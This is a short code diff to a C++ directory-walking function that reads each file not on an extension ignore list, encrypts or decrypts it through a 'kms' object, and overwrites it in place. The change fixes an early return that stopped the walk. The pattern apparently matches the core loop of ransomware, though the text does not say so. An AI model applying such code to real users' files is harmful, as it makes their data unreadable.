@@ -116,6 +116,7 @@ void explore(char* str_dir)
     ifstream in_file;
     char* buffer;
     int size;
+    bool file_to_ignore;
 
     while (dir.has_next)
     {
@@ -128,39 +129,41 @@ void explore(char* str_dir)
         }
         else if(!file.is_dir)
         {
-
+            file_to_ignore = false;
             for(unsigned i=0;i<ext_to_ignore.size();i++)
             {
                 if(strstr(file.name,ext_to_ignore[i]) != 0)
-                    return;
+                {
+                    file_to_ignore = true;
+                    break;
+                }
             }
-
-            in_file.open(file.path,ios::binary);
-            in_file.seekg(0,ios::end);
-            size = in_file.tellg();
-            in_file.seekg(0);
-
-            if(size > 0)
+            if(!file_to_ignore)
             {
-                printf("working on %s ...\n",file.path);
-                buffer = new char[size];
-                in_file.read(buffer,size);
-                in_file.close();
-                if(to_crypt)
-                    kms.crypt(&buffer,size,info);
-                else
-                    kms.decrypt(&buffer,size);
-                out_file.open(file.path,ios::binary);
-                out_file.write(buffer,size);
-                out_file.close();
+                in_file.open(file.path,ios::binary);
+                in_file.seekg(0,ios::end);
+                size = in_file.tellg();
+                in_file.seekg(0);
 
-                delete buffer;
+                if(size > 0)
+                {
+                    printf("working on %s ...\n",file.path);
+                    buffer = new char[size];
+                    in_file.read(buffer,size);
+                    in_file.close();
+                    if(to_crypt)
+                        kms.crypt(&buffer,size,info);
+                    else
+                        kms.decrypt(&buffer,size);
+                    out_file.open(file.path,ios::binary);
+                    out_file.write(buffer,size);
+                    out_file.close();
+
+                    delete buffer;
+                }
             }
-
-
 
         }
-
         tinydir_next(&dir);
 
     }
